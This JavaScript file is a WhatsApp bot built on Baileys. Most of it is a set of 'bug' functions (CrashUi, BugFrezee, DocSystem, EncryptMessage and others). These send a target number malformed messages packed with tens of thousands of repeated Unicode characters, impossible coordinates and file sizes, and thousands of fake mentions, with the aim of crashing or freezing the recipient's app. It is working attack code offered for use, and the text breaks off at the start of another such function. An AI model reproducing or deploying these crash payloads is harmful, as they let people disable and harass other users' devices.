//Subscribe YouTube: XbatsOffc
//©GulbatOfficial
require("./settings")
const fs = require('fs')
const path = require('path')
const util = require('util')
const os = require('os')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const archiver = require('archiver')
const foto = fs.readFileSync('./image/GulbatOfficial.jpg')
const speed = require('performance-now')
const { runtime, formatp, sleep } = require('./lib/func')
const { exec } = require("child_process")
module.exports = async (XbatsOffc, m, store) => {
try {
const from = m.key.remoteJid
const FileType = require('file-type')
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
  } = require("@whiskeysockets/baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
async function fetchJson(url, options) {
    const res = await fetch(url, options);
    return await res.json();
}
const isPc = from.endsWith('@s.whatsapp.net')
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = await XbatsOffc.decodeJid(XbatsOffc.user.id)
const sender = m.key.fromMe ? (XbatsOffc.user.id.split(':')[0]+'@s.whatsapp.net' || XbatsOffc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot

const groupMetadata = isGroup ? await XbatsOffc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const contactJsonPath = './database/contact.json';
const contactVcfPath = './database/contacts.vcf';

const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)

//Fake Quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qpanel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363333019033320@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${ownername}`, inviteExpiration: 0 }}}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •`
}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: '• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •',jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Bot"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚 •`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `• 𝐥𝐞𝐭𝐭𝐲𝐜𝐡𝐢𝐚•`,jpegThumbnail: ""}}}

XbatsOffc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
}
// Random Image
const imageUrls = [
        "https://i.ibb.co/m944LxT/image.jpg",
        "https://i.ibb.co/mHSbM3d/image.jpg",
        "https://files.catbox.moe/g4ae8u.jpg",
        "https://files.catbox.moe/9vp33w.jpg",
        "https://files.catbox.moe/6s1c3e.jpg"
    ];
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];
// Reply
const replyz = (teks) => {
    return XbatsOffc.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, {})
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(999999),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: "991111199",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `☢︎𝗛𝗲𝘅𝗗𝗲𝗮𝘁𝗵 𝟭.𝟭 𝗩𝗶𝗽☢︎`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

async function payreply(teks) {
const ppuser = "https://files.catbox.moe/uvlm9q.jpg"; 
return XbatsOffc.sendMessage(
m.chat, { text: `${teks}`, contextInfo: { 
mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, 
title: "𝗚𝘂𝗹𝗯𝗮𝘁𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹", 
body: "GulbatOfficial", 
previewType: "PHOTO" }}}, 
{ quoted: lol })}



//╍╍╍╍╍╍〔𝗔𝗪𝗔𝗟 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡〕╍╍╍╍╍╍╍╍//

async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⿻ CrazyCrash ⿻",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ThM
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤" + "ꦾ".repeat(70000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [cct ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"\n⿻ VolgiodCrash ⿻\n\n" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"⿻ VolgiodCrash ⿻\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"⿻ CrazyCrash ⿻\",\"sections\":[{\"title\":\"DinzBotz IS HERE ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DinzBotz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: X,
        quoted: Qtd
      });
      await XbatsOffc.relayMessage(X, etc.message, ptcp ? {
        participant: {
          jid: X
        }
      } : {});
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ DinzID Chx ⿻ ▾⭑"));
    }
    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "𝐕𝐨𝐥𝐠𝐢𝐨𝐝𝐁𝐚𝐜𝐤🎭",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ThM
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [cct ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ★\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟\",\"sections\":[{\"title\":\"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY XXEN DEV\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: X,
        quoted: VisiX
      });
      await XbatsOffc.relayMessage(X, etc.message, ptcp ? {
        participant: {
          jid: X
        }
      } : {});
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
    }
    async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤▾ ⿻ 𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "⚝𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⚝",
                  address: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                  jpegThumbnail: ThM
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 玄",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                    sections: [{
                      title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: X,
        quoted: EsQl
      });
      await XbatsOffc.relayMessage(X, etc.message, ptcp ? {
        participant: {
          jid: X
        }
      } : {});
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ XxenTzy ⿻ ▾⭑"));
    }
    async function OLDLOC(target, QBug) {
      var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 \n",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 999.035,
                  jpegThumbnail: global.thumb
                },
                hasMediaAttachment: true
              },
              body: {
                text: "ꦾ".repeat(20) + "@1".repeat(50000)
              },
              nativeFlowMessage: {
                messageParamsJson: " ꦾ".repeat(55000)
              },
              carouselMessage: {}
            }
          }
        }
      }), {
        userJid: target,
        quoted: QBug
      });
      await XbatsOffc.relayMessage(target, atc.message, {
        participant: {
          jid: target
        },
        messageId: atc.key.id
      });
    }
    ;
    async function BugFrezee(target) {
      XbatsOffc.relayMessage(target, {
        viewOnceMessage: {
          message: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
              fileLength: "1991837291999",
              pageCount: 199183729199991,
              mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
              fileName: "DeepDocumentDpr",
              fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
              directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1728631701",
              contactVcard: true,
              caption: " ꦾ".repeat(20) + "@1".repeat(50000),
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 🥶"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0":"🎭𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⃟⃟⃟⃟⃟꙰꙰꙰꙰꙰꙰꙰꙱҈҈҈҈҈҈҉҉᠁",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      });
    }
    ;
    async function EncryptMessage(target) {
      const locationMessageContent = proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 999.035,
              name: "ꦾ".repeat(50000),
              url: "@1".repeat(30),
              mentionedJid: ["1@s.whatsapp.net", ...Array.from({
                length: 15000
              }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)],
              jpegThumbnail: global.thumb
            }
          }
        }
      });
      const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, {
        userJid: target
      });
      await XbatsOffc.relayMessage(target, encryptedMessage.message, {
        participant: {
          jid: target
        }
      });
    }
    ;
    async function DocSystem(target) {
      let virtex = "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟";
      XbatsOffc.relayMessage(target, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999",
                  pageCount: 9999999999999,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: virtex,
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟" + "ꦾ".repeat(50000) + "@1".repeat(30)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "DinzBotz || Volgiod"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      });
    }
    ;
    async function DocSystem2(target) {
      XbatsOffc.relayMessage(target, {
        viewOnceMessage: {
          message: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
              fileLength: "1991837291999",
              pageCount: 199183729199991,
              mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
              fileName: "DeepDocumentDpr",
              fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
              directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1728631701",
              contactVcard: true,
              caption: " ꦾ".repeat(20) + "@1".repeat(50000),
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "DinzBotz"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "KILLERBYMOON",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "putzzdragons@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      });
    }
    ;
    async function DocSystem3(target) {
      XbatsOffc.relayMessage(target, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999",
                  pageCount: 9999999999999,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: "MOON TECH",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                title: "Tra͢sᯭh͢ Ui-Aviliable",
                hasMediaAttachment: true
              },
              body: {
                text: "TypeTrashUi-Killer"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }]
              },
              contextInfo: {
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name:"galaxy_message",
                      paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "MOON KILLER",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "DinzBotz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      }, {
        messageId: null
      });
    }
    ;
    async function FrezeeMsg2(target) {
